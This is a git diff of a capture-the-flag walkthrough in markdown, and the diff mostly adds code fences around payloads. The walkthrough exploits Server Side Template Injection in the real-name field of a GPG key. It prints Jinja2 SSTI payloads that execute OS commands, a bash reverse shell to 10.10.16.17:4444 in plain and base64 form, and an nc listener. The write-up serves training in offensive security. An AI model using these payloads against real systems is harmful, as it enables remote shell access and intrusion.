@@ -45,12 +45,13 @@ gpg --gen-key
 
 #### First Try
 Try SSTI in real name field is vulnerable to SSTI (Server Side Template Injection). So for testing I put `{{7*7}}` payload in the name field. If it is vulnerable then it will give output `49` as a name.
-
+```
 {% raw %} 
 Real name: {{7*7}}
 Email: anymail
 password: A1234567
 {% endraw %}
+```
 
 Checking all generate Keys.
 ```
@@ -98,18 +99,21 @@ gpg --list-key
 ```
 
 Then I again generate keys but this time the payload will be different. In the name field I put this payload below:
-
+```
 {% raw %} 
 {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 {% endraw %}
+```
 
 #### Second Try
+```
 {% raw %} 
 gpg --gen-key
 Real name: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 Email: abdo@gmail.com
 password: A1234567
 {% endraw %}
+```
 
 Then we have to make our **Public Key** with the following command for Encryption.
 ```
@@ -144,9 +148,11 @@ echo "bash -i >& /dev/tcp/10.10.16.17/4444 0>&1" | base64
 Result: `YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK`
 
 The final payload:
+```
 {% raw %}
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEK" | base64 -d | bash').read() }}
 {% endraw %}
+```
 
 First, make our listener
 ```
@@ -154,12 +160,14 @@ nc -nvlp 4444
 ```
 
 #### Third Try
+```
 {% raw %}
 gpg --gen-key
 Real name: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNy80NDQ0IDA+JjEnCg==" | base64 -d | bash').read() }}
 Email: abdo@gmail.com
 password: A1234567 Admin123
 {% endraw %}
+```
 
 Then we have to make our Public Key with the following command for Encryption
 ```
